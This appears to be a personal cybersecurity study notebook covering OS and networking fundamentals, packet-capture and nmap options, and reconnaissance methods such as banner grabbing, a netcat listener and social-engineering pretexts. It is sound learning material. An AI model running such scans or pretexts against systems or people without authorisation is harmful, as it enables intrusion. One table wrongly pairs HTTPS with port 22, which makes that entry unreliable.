# CyberNotebook
Collection of notes regarding Cybersecurity vocabulary for my personal reference.

## Table of Contents
### OS Fundamentals
+ [Windows Fundamentals](#windows-fundamentals)
+ [Linux Shells](#linux-shells)
### Networking Fundamentals
+ [Networking Basics](#networking-basics)
+ [Networking Core Protocols](#networking-core-protocols)
+ [Networking Secure Protocols](#networking-secure-protocols)
+ [Networking Tools](#networking-tools)
  + [Wireshark](#wireshark)
  + [tcpdump](#tcpdump)
  + [nmap](#nmap)
### Networking Security
+ [Passive Reconnaissance](#passive-reconnaissance)
+ [Active Reconnsaissance](#active-reconnaissance)
    + [Network Scanning](#network-scanning)
        + [nmap Live Host Discovery](#nmap-live-host-discovery)
        + [nmap Basic Port Scanning](#nmap-basic-port-scanning)
        + [nmap Advanced Port Scanning](#nmap-advanced-port-scanning)
        + [nmap Post Port Scanning](#nmap-post-port-scanning)
+ [Network Attacks](#network-attacks)
### Cryptography/Hashing Fundamentals
+ [Cryptography](#cryptography)
+ [Hashing](#hashing)
+ [Cracking Hashes](#cracking-password-hashes)
  + [Hashcat](#hashcat)
  + [John the Ripper](#john-the-ripper)
### Languages
+ [JavaScript](#javascript)
+ [SQL](#sql)
### Offensive Security Concepts
+ [Web Applications](#web-applications)
+ [OWASP Top 10 (2021)](#owasp-top-10-2021)
+ [Penetration Testing](#penetration-testing)
+ Web Hacking
    + [Walking an Application](#walking-an-application)
    + [Content Discovery](#content-discovery)
    + [Subdomain Enumeration](#subdomain-enumeration-1)
    + [Authentication Bypass](#authentication-bypass)
    + Vulnerabilities
        + [IDOR](#idor)
        + [File Inclusion](#file-inclusion)
        + [SSRF](#ssrf)
        + [XSS](#xss)
        + [Command Injection/RCE](#command-injection--rce)
        + [SQLi](#sqli)
+ [Privilege Escalation](#privilege-escalation)
    + [Tools](#tools)
### Offensive Security Tools
+ [Metasploit](#metasploit)
+ [Burp Suite](#burp-suite)
+ [Hydra](#hydra)
+ [Gobuster](#gobuster)
+ [Shells](#shells)
    + [Shell Payloads](#shell-payloads)
+ [SQLMap](#sqlmap)
### Defensive Security Concepts
+ [SOC](#soc)
+ [Digital Forensics](#digital-forensics)
+ [Incident Response](#incident-response)
+ [Vulnerability Scanning](#vulnerability-scanning-1)
  + [OpenVAS](#eg-scanning-w-openvas)
+ [Logs](#logs)
+ [SIEM](#siem)
+ [Firewalls](#firewalls)
+ [IDS](#ids)
  + [Snort](#eg-snort)
### Defensive Security Tools
+ [CyberChef](#cyberchef)
+ [CAPA](#capa)
+ [REMnux](#remnux)
+ [FlareVM](#flarevm)

## OPSEC
<b>Step 1: Identify critical information</b>

Critical information may include:
+ Intentions
+ Capabilities
+ Activities
+ Limitations

<b>Step 2: Analyse threats</b>

Answer the following questions:
+ Who is the adversary?
+ What are the adversary's goals?
+ What tactics, techniques, and procedures (TTPs) do they use?
+ What critical information has the adversary obtained?

*threat = adversary + intent + capability*

<b>Step 3: Analyse vulnerabilities</b>

An OPSEC vulnerability occurs when an adversary can obtain critical information, analyse them, and affect your plans.


<b>Step 4: Assess risks</b>

Risk assessment requires the following:
+ Learning the possibility of an event taking place
+ Estimating the expected cost of the event
+ Assessing the adversary's ability to exploit vulnerabilities


<b>Step 5: Apply appropriate countermeasures</b>

Countermeasures are designed to prevent an adversary from detecting critical information, provide alternative interpretations of critical information/indicators, or deny the advesary's collection system.

Consider these factors:
+ Efficiency of the countermeasure in reducing the risk
+ Cost of the countermeasure compared to the impact of the vulnerability being exploited
+ Possibility that the countermeasure can reveal information to the adversary

## Elastic/ELK Stack
Elastic stack is the collection of different open source components that help users take data from any source and format to perofrm a search, analyse, and visualise data in real-time.

The components include:
+ *Elasticsearch* - full-text search and analytics engine used to store JSON-formatted documents; supports RESTFul API to interact with the data
+ *Logstash* - data processing engine used to take data from different sources, apply filters/normalise them, and send to the destination such as Kibana/listening port; configuration file is dvided into input, filter, and output parts
+ *Beats* - host-based agent known as Data-shippers used to ship/transfer data from endpoints to elasticsearch; each beat is a single-purpose agent that sends specific data (e.g. Winlogbeat:windows event logs, Packetbeat:network traffic flows)
+ *Kibana* - web-based data visualiusation that works with elasticsearch to analyse, investigate, and visualise data streams in real-time; allows users to create multiple visualisations and dashboards

## Atomic Red Team
Atomic Red Team is an open-source framework for performing security testing and threat emulation, consisting of TTPs that simulate various types of attacks and security threats (e.g. malware, phishing attacks, network compromise)

*Atomics* - different testing techniques based on the MITRE ATT&CK framework that security analysts can use to emulate a specific technique.

## Windows Fundamentals
### NTFS
*New Technology File System (NTFS)* - file system used in modern version of Windows

NTFS addresses many limitations of previous file systems (i.e. FAT16/FAT32, HPFS):
+ Supports larger file sizes
+ Sets specific permissions on folders/files
+ Folder/file compression
+ Encryption using Encryption File System (EFS)

Permissions include:
+ Full control
+ Modify
+ Read & execute
+ List folder contents
+ Read
+ Write

*Alternate Data Streams (ADS)* - file attribute specific to NTFS

### Windows\System32
C:\Windows traditionally contains the OS. This is where the environmental variables are. The system environment variable for the Windows directory is *%windir%*.

System32 folder holds all the critical files for the OS.

### User Accounts, Profiles, & Permissions
User account type can either be: 
+ *administrator* - can make changes to the system (e.g. add users, delete users, modify groups, modify system settings, etc)
+ *standard user* - can only make change to folders/files attributed to the user

Running *lusrmgr.msc* will open the *Local User and Group Management*.

*User Account Control (UAC)* - prompts confirmation from the admin user when an operation requiring higher-level privileges needs to execute

### MSConfig
The *System Configuration* utility is for troubleshooting, primarily to help diagnose startup issues.

The utility has five tabs:
1. General - select what devices and services to load on boot (i.e. Normal, Diagnostic, Selective)
2. Boot - define various boot options for the OS
3. Services - lists all services configured for the system, both running or stopped
4. Startup - manage startup items
6. Tools - various utilities

Tools include:
+ *Change UAC Settings*
+ *Computer Management (compmgmt)*, which includes Task Scheduler, Event Viewer, Device Manager, Local Users & Groups, etc.
+ *System Information (msinfo32)* gathers information and displays hardware, system components, and software environment
+ *Resource Monitor (resmon)* displays CPU, memory, disk, and network usage information; start, stop, pause and resume services
+ *Command Prompt (cmd)*
+ *Registry Editor (regedit)* edit Windows Registry, which is the database that stores user profiles, installed applications, property sheet settings for folders/application icons, hardware, used ports

### Windows Security
*Windows Update* provides security updates, feature enhancements, and patches for the OS, and other products. 

**control /name Microsoft.WindowsUpdate**: access Windows Update

*Windows Security* centralises the management of device and data protection tools. Protection areas include:
+ Virus & threat protection - scans, threat history, manage settings, check updates, ransomware protection
+ Firewall & network protection - firewall settings (i.e. domain, private, public), advanced settings; **WF.msc**: opens Windows Defender Firewall
+ App & browser control - Microsoft Defender Smartscreen, check apps and files, exploit protection 
+ Device security - core isolation (i.e. memory integrity), security processor details (i.e. TPM)

*BitLocker* is a data protection feature using drive encryption. Most protection is achieved when used with a TPM version 1.2 or later. 

*Volume Shadow Copy Service (VSS)* creates a consistent shadow copy (i.e. snapshot, point-in-time copy) of data to be backed up. These copies are stored on the System Volume Information folder on each drive that has protection enabled. If enabled (i.e. System Protection is turned on), the following tasks can be performed:
+ Create a restore point
+ Perform system restore
+ Configure restore settings
+ Delete restore points

## Linux Shells
Linux has different types of shells available, each with their own features.

**echo $SHELL**: displays which shell you are using

**cat /etc/shells**: lists all installed shells on the system

To switch between these shells, simply type the shell name (e.g. **zsh**)

Some common shells include:
| Feature | Bash | Fish | Zsh |
| :-----: | :------: | :------: | :------: |
| Full Name | Bourne Again Shell | Friendly Interactive Shell | Z Shell |
| Scripting | Offers widely compatible scripting w/ documentation | Limited scripting features | Combines Bash shell scripting with some extra features |
| Tab Completion | Basic tab completion | Advanced tab completion | Can be extended by using plugins |
| Customisation | Basic customisation | Offers customisation using interactive tools | Advanced customisation through oh-my-zsh framework |
| User Friendliness | Less user-friendly | Most user-friendly | Highly user-friendly with proper customisation |
| Syntax Highlighting | Not available | Built-in | Can be used with some plug-ins |

Script files can be edited using any text editor and has the extension *.sh*. Every script should also start from shebang: *#!* followed by the name of the interpreter (e.g. /bin/bash)

Some basic script commands:
+ **read [variable_name]**: asks user input and saves to a variable
+ **for i in {x..y}; do**: for loop
+ **if [ "$variable" = "Text" ]; then**: if statement

To execute scripts, it has to be given execution permissions. 

**chmod +x [variable_script.sh]**: give execution permission to the script

## Networking Basics
*Networks* are the connections between technological devices. These can be formed from two devices to billions. A network can be one of two types:
+ Private
+ Public

The *Internet* is simply a giant network that consists of many smaller networks. The first iteration was ARPANET in the 1960s, which then led to the creation of the World Wide Web (WWW). 

Devices have two identifiable fingerprints: 
+ *Internet Protocol (IP) Address* - identifies a host on a network; can be public or private; can be IPv4 or IPv6
+ *Media Access Control (MAC) Address* - unique 12 hexadecimal number that identifies vendor and unique address of the network interface

RFC 1918 defines the following three ranges of private IP addresses:
+ 10.0.0.0 - 10.255.255.255 (10/8)
+ 172.16.0.0 - 172.31.255.255 (172.16/12)
+ 192.168.0.0 - 192.168.255.255 (192.168/16)

### Networking Devices
A *switch* is a device that aggregates multiple networking-capable devices using ethernet. 

A *router* is a device that connects networks and pass data between them. Routing involves creating a path between networks for data to be delivered. 

### Routing Algorithms
Routing algorithms are used by routers to figure out which appropriate links to send packets to. Some algorithms include:
+ *Open Shortest Path First (OSPF)* - routers hare information about network topology and calculate the most efficient paths; routers exchange updates about the state of their connected links and networks
+ *Enhanced Interior Gateway Routing Protocol (EIGRP)* - a Cisco proprietary protocol; routers share information about the networks they can reach and the bandwidth/delay costs associated with these routes
+ *Border Gateway Protocol (BGP)* - the primary protocol used on the Internet; allows different networks (e.g. ISPs) to exchange routing information and establish paths between the networks
+ *Routing Information Protocol* - often used in small networks; routers share information about networks they can reach and the number of hops required; each router builds a routing table

### Subnets
*Subnetting* is used to split the number of hosts that can fit in a network, represented by a number called the subnet mask (e.g. 255.255.255.0). Subnets use IP addresses in three ways:
+ Identify the network address (i.e. 192.168.1.0)
+ Identify the host address (i.e. 192.168.1.100)
+ Identify the default gateway (i.e. 192.168.1.254)

### VLANs
A *Virtual Local Area Network (VLAN)* allows specific devices within a network to be virtually split up. This sepration provides security by enforcing rules to determine how specific devices communicate with each other.

### ISO OSI Model
The *Open Systems Interconnection (OSI) Model* provides a framework dictating how all networked devices send, receive, and interpret data. This model consists of seven layers, wherein specific process take place, and pieces of information are added to the data. These layers are the following:

| Layer # | Layer Name | Main Function | Example Protocols & Standards |
| :-----: | :------: | :------: | :------: |
| Layer 7 | Application layer | Providing services and interfaces to applications | HTTP, FTP, DNS, POP3, SMTP, IMAP |
| Layer 6 | Presentation layer | Data encoding, encryption, and compression | Unicode, MIME, JPEG, PNG, MPEG |
| Layer 5 | Session layer | Establishing, maintaining, and synchronising sessions | NFS, RPC |
| Layer 4 | Transport layer | End-to-end communication and data segmentation | UDP, TCP |
| Layer 3 | Network layer | Logical addressing and routing between networks | IP, ICMP, IPSec |
| Layer 2 | Data-Link layer | Reliable data transfer between adjacent nodes | 802.3, 802.11 |
| Layer 1 | Physical layer | Physical data transmission media | Electrical, optical, and wireless signals |

### TCP/IP Model (RFC 1122)
While the OSI model is conceptual, the *Transmission Control Protocol/Internet Protocol (TCP/IP) model* is implemented. A strength of this model is that it allows a network to continue to function as parts of it become out of service. This is made possible due to the design of routing protocols to adapt as network topologies change. This model is as follows:

| Layer # | OSI Model | TCP/IP Model | Example Protocols & Standards |
| :-----: | :------: | :------: | :------: |
| Layer 7 | Application layer | Application layer | HTTP, FTP, DNS, POP3, SMTP, IMAP |
| Layer 6 | Presentation layer |  |  |
| Layer 5 | Session layer |  |  |
| Layer 4 | Transport layer | Transport layer | UDP, TCP |
| Layer 3 | Network layer | Internet layer | IP, ICMP, IPSec |
| Layer 2 | Data-Link layer | Link layer | 802.3, 802.11 |
| Layer 1 | Physical layer |  |  |

### Packets
*Packets* are small pieces of data that combine together to make a piece of information/message. *Frames* are slightly different as they are at layer 2, meaning no information such as IP addresses are included. These have a set of headers that include:
+ Time to Live (TTL) - sets an expiry timer for the packet
+ Checksum - provides integrity checking, where changes in data will indicated corrupted packets
+ Source Address - IP address of the device the packet is being sent from
+ Destination Address - IP address the packet is being sent to

### Encapsulation
*Encapsulation* is the process of every layer adding a header/trailer to a received unit of data. The process is as follows:
1. We start with application data.
2. At the transport layer, a TCP or UDP header is added to create a *TCP segment* or *UDP datagram*.
3. At the network layer, an IP header is added to get an *IP packet*, which can be router over the Internet.
4. Lastly, a header and trailer is added to get a *WiFi/Ethernet frame* at the link layer.

### TCP
*Transmission Control Protocol (TCP)* guarantees that any data sent will be received on the other end. This protocol operates at the transport layer (i.e. layer 4). This is done via a 'three-way handshake':
1. SYN message is send by the client; initiates a connection and sychronises the two devices.
2. SYN/ACK packet is sent by the receiving device.
3. ACK packet is used to acknowledge that the series of packets have been received.
4. Once the connection has been established, DATA message is sent.
5. FIN packet is used to cleanly close the connection after completion.
6. *A RST packet is the last resort used to abruptly end all communication, usually done if there is a problem.

### UDP
*User Datagram Protocol (UDP)* is a stateless protocol that does not require a constant connection between devices (i.e. three-way handshake not needed). This also means that there are no data integrity safeguards in place. However, UDP communication is much faster than TCP. This protocol operates at the transport layer (i.e. layer 4)

### Ports & Port Forwarding
Networking devices use *ports* to communicate with each other. There are rules for which protocols apply to which ports. These include the following:
+ 21 for FTP
+ 22 for SSH
+ 80 for HTTP
+ 443 for HTTPS
+ 445 for SMB
+ 3389 for RDP

*Port fowarding* allows connection of application and services to the internet by opening specific ports. This can be configured at a network's router.

### DHCP
*Dynamic Host Configuration Protocol (DHCP)* automatically assigns IP addresses to devices in a network. This is an application-level protocol that relies on UDP. The server listens on UDP port 67, and the client sends from UDP port 68. 

This protocol follows the Discover, Offer, Request, and Acknowledge (DORA) steps. This process is done by:
1. A newly connected device sends out a DHCPDISCOVER request to see if any DHCP servers are on the network.
2. The DHCP server replies with a DHCPOFFER, an IP address the device can use.
3. The device then sends a DHCPREQUEST, confirming that it wants the IP address.
4. Lastly, the DHCP server sends a DHCPACK, acknowledging that the device can start using the IP address.

### ARP
*Address Resolution Protocol (ARP)* allows a device to associate its MAC address with an IP address on a network (i.e. translation from layer 3 to layer 2 addressing). Each device on a network will keep logs of the MAC addresses associated with other devices. 

This is done by:
1. ARP Request is broadcasted on the network (i.e. asking for the IP address for a particular MAC address).
2. The owning device will send an ARP Reply with its MAC address.
3. The requesting device maps and stores this in its ARP cache.

Note that an ARP Request or ARP reply is not encapsulated within a UDP or IP packet. Rather, it is encapsulated directly within an Ethernet frame.

### ICMP
*Internet Control Message Protocol (ICMP)* is mainly for network diagnotics and error reporting. Two popular commands that rely on ICMP are:
+ **ping**: uses ICMP (i.e. ICMP type 8 - Echo Request, ICMP type 0 - Echo Reply) to test connectivity to a target system and measures rount-trip time (RTT)
+ **tracert/traceroute**: uses ICMP (i.e. ICMP type 11 - Time Exceeded message) to discover the route from your host to target machine

### NAT
*Network Address Translation (NAT)* allows the use of one public IP address to provide Internet access to many private IP addresses. This is done by NAT-supporting routers maintaining a table that translates network addresses between internal and external networks. In effect, the internal network would use a private IP address (i.e. intra-network), while the external network (i.e. gateway to the Internet) would use the public IP address.

## Networking Core Protocols
Summary of default port numbers of the protocols listed below:

| Protocol | Transport Protocol | Default Port # |
| :------: | :----------------: | :------------: |
| TELNET | TCP | 23 |
| DNS | UDP/TCP | 53 |
| HTTP | TCP | 80 |
| HTTPS | TCP | 443 |
| FTP | TCP | 21 |
| SMTP | TCP | 25 |
| POP3 | TCP | 110 |
| IMAP | TCP | 143 |

### Telnet
The *Teletype Network (TELNET)* protocol allows connection and communication with a remote system and issue text commands. This can be used for remote administration or to connect to any server listening on a TCP port number.

**telnet [ip_address] [port_num]**: connects to a target machine at a specific port

E.g. Connect to webserver
```
telnet [MACHINE_IP] 80
GET /index.html HTTP/1.1
host: telnet
```

### DNS
(Remembering Addresses)

*Domain Name System (DNS)* allows a simple way for devices to communicate with the internet without remembering IP addresses. To visit a website, the website name can be entered instead.
+ A *Top-Level Domain (TLD)* is the most righthand part of a domain name (e.g. .com in tryhackme.com).
+ A *Second-Level Domain* includes the domain name (e.g. tryhackme in tryhackme.com)
+ A *subdomain* sits on the left-hand side of the domain name, using a period to separate it (e.g. admin in admin.tryhackme.com). Multiple subdomains that are split with periods can create longer names (e.g. jupiter.servers in jupter.servers.tryhackme.com)

Types of DNS records include:
+ A Record - resolve to IPv4 addresses
+ AAAA Record - resolve to IPv6 addresses
+ CNAME Record - resolve to another domain name
+ MX Record - resolve to the address of the servers that handle email for the domain being queried
+ TXT Record - free text fields where any-text based data can be stored; commonly used to list servers that have authority to send emails on behalf of the domain; can also be used to verify ownership of the domain name

DNS request process:
1. When requesting a domain name, your device first checks its local cache. If not available, a request to your Recursive DNS server will be made.
2. A Recursive DNS Server then check its own local cache. If the request cannot be found locally, it queries the internet's root DNS servers.
3. The root server will recognise the TLD of the request and refer you to the correct TLD server.
4. The TLD server holds records for where to find the authoritative server for the DNS request, where DNS records for domain names are kept.
5. The DNS record is then sent back to the Recursive DNS Server, where a local copy will be cached for future requests. This record will have a TTL value.

DNS operates at layer 7, using UDP port 53 by default and TCP port 53 as a default fallback.

### WHOIS
A *WHOIS* record provides information about the entity that registered a domain name, including their name, phone number, email, and address. Note that privacy services can hide information, if required.

**whois**: looks up the WHOIS records of a registered domain name

### HTTP
(Accessing the Web)

*HyperText Transfer Protocol (HTTP)* is the set of rules used for communicating with web servers for the transmition of webpage data (e.g. HTML, images, videos, etc)

Popular HTTP servers include:
+ Apache
+ Internet Information Services (IIS)
+ nginx

Note: Apache and Nginx are open-source, while IIS requires a paid license

*Cookies* are small pieces of data that is stored on your computer. As HTTP request is stateless (i.e. does not keep track of previous requests), cookies can be used to remind the web server information about you, your settings, or whether you have been to the website before.

### FTP
(Transferring Files)

*File Transfer Protocol (FTP)* is designed to transfer files, which it can achieve at higher speeds than HTTP.

Example FTP commands include:
+ USER [username] - used to input the username
+ PASS [password] - used to enter the passwords
+ RETR [file_name] - used to download a file from the FTP server to the client
+ STOR [file_name] - used to upload a file from the client to the FTP server

FTP server listens on TCP port 21 by default. Data transfer is conducted via another connection from the client to the server.

**ftp [IP address]**: connects to the remote FTP server using the local ftp client

### SMTP
(Sending Email)

*Simple Mail Transfer Protocol (SMTP)* defines how a mail client communicates with a mail server and how a mail server communicates with another. Particularly, SMTP communicates with a Mail Transfer Agent (MTA) (i.e. sending email).

Example SMTP commands used by the mail client to the SMTP server:
+ HELO/EHLO - initiates an SMTP session
+ MAIL FROM [email_address] - specifies the sender's email address
+ RCPT TO [email_address] - specifies the recipient's email address
+ DATA [text] - indicates that the client will begin sending the email contents
+ . - indicates the end of the email message

The SMTP server listens on TCP port 25 by default.

### POP3
(Receiving Email)

The *Post Office Protocol v3 (POP3)* allows the client to communicate with a mail server to retrieve email messages. Particularly, POP3 interacts with the Mail Deliver Agent (MDA) (i.e. downloading email).

Some common POP3 commands include:
+ USER [username] - identifies the user
+ PASS [password] - provides the user's password
+ STAT - requests the number of messages and total size
+ LIST - list all messages and their size
+ RETR [message_number] - retrieves the specified message
+ DELE [message_number] - marks a message for deletion
+ QUIT - ends the POP3 session, while applying changes (e.g. deletions)

The POP3 server listens on TCP port 110 by default.

### IMAP
(Syncrhonising Email)

The *Internet Message Access Protocol (IMAP)* allows synchronising read, moved, and deleted messages. This is particularly useful for checking emails via multiple clients. As an effect, IMAP tends to use more storage as emails are kept on the server to be synchronised across the email clients.

Some example of IMAP protocol commands include:
+ LOGIN [username] [password] - authenticates the user
+ SELECT [mailbox] - selects the mailbox folder
+ FETCH [mail_number] [data_item] - gets the message number and required data (e.g. fetch 3 body[])
+ COPY [sequence_set] [data_item] - copies the specified messages to another mailbox
+ LOGOUT - logs out

The IMAP server listens on TCP port 143 by default.

## Networking Secure Protocols
### TLS
*Transport Layer Security (TLS)* is a cryptographic protocol operating at the transport layer, which allows secure communication between a client and a server over an insecure network. TLS ensures that no one can read or modify the exchanged data. Note: modern servers can be expected to be using TLS

*Secure Sockets Layer (SSL)* is the precursor to TLS. Note: TLS is more secure

SSL and TLS can be added in the presentation layer.

TLS revolves around the use of signed TLS certificates. The process is as follows:
1. Server administrator submits a Certificate Signing Request (CSR) to a Certificate Authority (CA).
2. The CA verifies the CSR and issues a digital certificate.
3. Once the signed certificate is received, it can be used to identify the server/client to others, who can confirm the validity of the signature. Certificates of the signing authorities are installed on the host.

A summary of secure versions of protocols:

| Protocol | Default Port # |
| :------: | :------------: |
| HTTPS | 22 |
| HTTPS | 443 |
| SMTPS | 465/587 |
| POP3S | 995 |
| IMAPS | 993 |

### SSH
*Secure Shell (SSH)* provides a secure alternative to telnet. Nowadays, SSH clients are based on OpenSSH libraries and source code.

OpenSSH offers several benefits, including:
+ Secure Authentication - supports password-based authentication, public key, and two-factor authentication
+ Confidentiality - provides end-to-end encryption; notifies of new server keys to protect against MitM attacks
+ Integrity - cryptography protects integrity of traffic
+ Tunneling - creates a secure tunnel to route other protocols through (i.e. a VPN-like connection)
+ X11 Forwarding - allows use of graphical application over the network if connecting to a Unix-like system with a GUI

**ssh [username@hostname]**: connects to an SSH server; add **-X** to support running graphical interfaces

The SSH server listens on port 22.

### HTTPS
*HyperText Transfer Protocol Secure (HTTPS)* is the secure version of HTTP, where data is encrypted to stop people from seeing data being received and sent. It also gives assurances that you are talking to the correct web server, not a spoof. Essentially, this is HTTP with TLS.

Requesting a page over HTTPS will require the following three steps after resolving the domain name:
1. Establish a TCP three-way handshake with the target server
2. Establish a TLS session
3. Communicate using the HTTP protocol (e.g. issue HTTP request like Get / HTTP/1.1)

Opening the contents of HTTPS packets will return encrypted text. An encryption key is needed to read the contents.

### SMTPS, POP3S, & IMAPS
Adding TLS to SMTP, POP3, and IMAP appends an S for "Secure." They work the same way as HTTPS.

### SFTP & FTPS
*SSH File Transfer Protocol (SFTP)* allows secure file transfer. It is part of the SSH protocol suite and shares port 22. SFTP commands are Unix-like and can differ from FTP commands.

Note that SFTP is different from FTPS. *File Transfer Protocol Secure (FTPS)* uses TLS and port 990. FTPS requires certificate setup and can be tricky to allow over firewalls as it uses separate connections for control and data transfer. Meanwhile, SFTP setup is easy as it only requires enabling an option with OpenSSH.

**sftp [username@hostname]**: log in SFTP server

**get [file_name]**: download files

**put [file_name]**: upload files

### VPN
A *Virtual Private Network (VPN)* allows devices on separate networks to communicate securely by creating a dedicated path between each other over the Internet using a tunnel. Connected devices form their own private network. Some existing VPN technologies include:
+ PPP - allows for authentication and data encryption by using private keys and public certificates; not capable of leaving a network by itself (i.e. non-routable)
+ PPTP - allows data from PPP to travel and leave a network; weakly encrypted in comparison to alternatives
+ IPSec - encrypts data using the IP framework; difficult to set up but has strong encryption and device support

## Networking Tools
### Wireshark
*Wireshark* is an open-source network packet analyser tool. It can sniff and investigate live traffic and inspect packet captures (PCAP). Its use cases include:
+ Detecting and troubleshooting network problems (e.g. network load failure points and congestion)
+ Detecting security anomalies (e.g. rogue hosts, abnormal port usage, and suspicious traffic)
+ Investigating and learning protocol details (e.g. response codes and payload data)

Note that Wireshark is not an IDS. It only allows packet discovery and investigation. It does not modify packets.

Wireshark uses OSI layers to break down packets and use these layers for analysis. Packets details include:
+ The Frame (Layer 1) - shows what frame/packet you are looking at at the Physical layer
+ Source MAC (Layer 2) - shows the source and destination MAC addresses at the Data Link layer
+ Source IP (Layer 3) - shows the source and destination IPv4 addresses at the Network layer
+ Protocol (Layer 4) - shows the protocol used (i.e. UDP/TCP) and source and destination ports at the Transport layer
+ Protocol Errors - a continuation of the fourth layer that shows segments from TCP that need reassembly
+ Application Protocol (Layer 5) - shows details specific to the protocol used (e.g. HTTP, FTP, and SMB) at the Application layer
+ Application Data - extension of the fifth layer and can show application-specific data

### tcpdump
*tcpdump* is a tool that captures network traffic and taking a closer look at various protocols. This tool and its *libpcap* library were released for Unix-like systems. *winpcap* is the ported version to Windows.

**tcpdump**: main command 

Command line options for packet capture:
+ **-i [interface]**: captures packets on a specific network interface
+ **-w [file_name]**: writes captured packets to a file
+ **-r [file_name]**: reads captured packets from a file
+ **-c [count]**: captures a specific number of packets
+ **-n**: do not resolve IP addresses
+ **-nn**: do not resolve IP addresses and protocol numbers
+ **-v**: verbose display; can be **-vv** or **-vvv**

Some filtering options:
+ **host [ip_address]** or **tcpdump host [host_name]**: filters packets by IP or hostname
+ **src host [ip_address]**: filters by a specific source host
+ **dst host [ip_address]**: filters by a specific destination host
+ **port [port_number]**: filters by port number
+ **src port [port_number]**: filters by specified source port number
+ **dst port [port_number]**: filters by specified destination port number
+ **[protocol]**: filters by protocol (e.g. ip, ip6, icmp)
+ **greater [length]** or **tcpdump less [length]**: filters packets that have a length >= or <= than specified length
+ **[proto[expr:size]]**: refer to contents of any byte in the header
+ **[tcp[tcpflags]]**: refer to TCP flags field (e.g. tcp-syn, tcp-ack, tcp-fin, tcp-rst, tcp-push)

Some packet display options:
+ **-q**: quick output (i.e. brief packet info)
+ **-e**: print link-level header (i.e. MAC address)
+ **-A**: show in ASCII
+ **-xx**: show in hexadecimal format (i.e. hex)
+ **-X**: show headers and data in hex and ASCII

### nmap
*nmap* is a network scanner tool that can 1) discover other live devices on this/other network and 2) find out the network services running on these live devices (e.g. SSH, web servers)

**nmap**: main command to initiate nmap tasks; add **sudo** or be logged in as root
for full features

For listing targets:
+ **-sL [ip_address/subnet]**: lists the targets to scan without actually scanning them
  
For host discovery:
+ **-sn [ip_address/subnet]**: discover online hosts on a network

For port scanning:
+ **-sT [ip_address/subnet]**: attempt to complete TCP three-way handshake with every target TCP port (i.e. Connect Scan)
+ **-sS [ip_address/subnet]**: instead of a full three-way handshake, only the TCP SYN packet is sent (i.e. SYN Scan/Stealth)
+ **-sU [ip_address/subnet]**: scan for UDP services
+ **-F**: fast mode that scans the 100 most common ports
+ **-p[range]**: specifies a range of port numbers to scan; **-p-** scans all ports
+ **-Pn**: initiate a force scan (i.e. scan hosts that appear to be down)
  
For version detection:
+ **-O**: enable OS detection
+ **-sV**: enables version detection
+ **-A**: enables OS detection, version scanning, traceroute, and others

For timing control:
+ **-T[0-5]**: timing template; can be: 0-paranoid, 1-sneaky, 2-polite, 3-normal, 4-aggressive, 5-insane
+ **--min-parallelism [num_probes]** / **--max-rate [num_probes]**: minimum/maximum number of parallel probes
+ **--host-timeout [seconds]**: max amount of time to wait for a target host

For controlling real-time output:
+ **-v**: verbose output; can be **-vv**, **-vvvv**, **-v2**, **v4**
+ **-d**: debugging-level output; same with v, can add more d (i.e. up to **-d9**)

For controlling report output:
+ **-oN [file_name]**: normal output save
+ **-oX [file_name]**: XML output save
+ **-oG [file_name]**: grep-able output (i.e. for **grep** and **awk**)
+ **-oA [base_name]**: output in all major formats

## Networking Security
## Passive Reconnaissance
Passive reconnaissance refers to the use of publicly available resources to gain knowledge about a target. This is done without direct engagement.

Examples of passive recon activities include:
+ Looking up DNS records of a domain from a public DNS server
+ Checking job ads related to the target website
+ Reading news articles about a target company

### E.g. WHOIS
A WHOIS server listens on TCP port 43 for incoming requests. It replies with various information related to the domain requested, such as:
+ Which registrar was the domain name registered
+ Contact information of registrant
+ Creation, update, and expiration date
+ Which server to ask to resolve the domain name

**whois [domain_name]**: lookup a domain's WHOIS record

Note: information collected can lead to new attack surfaces (e.g. social engineering, technical attacks)

### E.g. nslookup
This protocol can be used to retrieve IP addresses and related information.

**nslookup [type] [domain_name]**: query a domain name 

The following query types can be retrieved:

| Query | Result |
| :------: | :-----: |
| A | IPv4 addresses |
| AAAA | IPv6 addresses |
| CNAME | Canonical name |
| MX | Mail servers |
| SOA | Start of authority |
| TXT | TXT records |

e.g. 
```
nslookup -type=A tryhackme.com 1.1.1.1
```

### E.g. dig
Similar to nslookup, the Domain Information Groper (dig) command allows for more advanced DNS queries.

**dig [domain_name] [type]**: query a domain name

e.g. 
```
dig @1.1.1.1 tryhackme.com MX
```

### E.g. DNSDumpster
[DNS Dumpster](https://dnsdumpster.com/) is a free online tool that can discover subdomains as well as other detailed DNS queries. This tool presents the information in easy to read tables. A single query can return IP addresses, geolocation, MX records, TXT records, and listening servers

### E.g. Shodan.io
[Shodan.io](https://www.shodan.io/) is a search engine for connected devices. This can be useful to learn information about a target network or learn about exposed devices.

Information provided include:
+ IP address
+ Hosting company
+ Geographic location
+ Server type and version

## Active Reconnaissance
Active reconnaissance requires direct engagement with a target. 

Examples of active recon activities include:
+ Connecting to company servers (e.g. HTTP, FTP, SMTP)
+ Calling the company in an attempt to gain information (i.e. social engineering)
+ Entering company premises pretending to be an employee

### E.g. Web Browser
By default, TCP port 80 and 443 are used by browsers to connect to a web server. 

Developer tools are useful to inspect web assets such as JS files, cookies, and directory structure of a site. Additionally, addons can aid in pentesting. These include:
+ [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) - allows changing proxy servers used; useful when using Burp Suite
+ [User-Agent Switcher & Manager](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher) - allows webpage access while pretending to be a different OS/browser
+ [Wappalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer) - provides information about technologies used by a website

### E.g. Ping
Ping can be used to check whether a remote system is online. 
```
ping [MACHINE_IP/Hostname]
```

Failed pings may indicate the following:
+ Destination machine is unresponsive (i.e. turned off, booting up)
+ Destination machine is unplugged from network
+ Firewall is blocking packets
+ Attacking machine is unplugged from network

### E.g. Traceroute
This command follows the route taken by packets from a source system to another host. 
```
traceroute [MACHINE_IP] or tracert [MACHINE_IP]
```

### E.g. Telnet
This command can be used to connect to any service and grab its banner. 
```
telnet [MACHINE_IP PORT]
```

### E.g. Netcat
Netcat can be used to act as a client or listener server on a port of your choice. 

To connect to a server:
```
nc [MACHINE_IP] [PORT]
GET / HTTP/1.1
host: [host_name]
```

To act as a listener server:
```
nc -lvnp PORT_NUMBER
```

## Network Scanning
Using nmap, a scan usually follows the steps below:
1. Enumerate targets
2. Discover live hosts
3. Reverse-DNS lookup
4. Scan ports
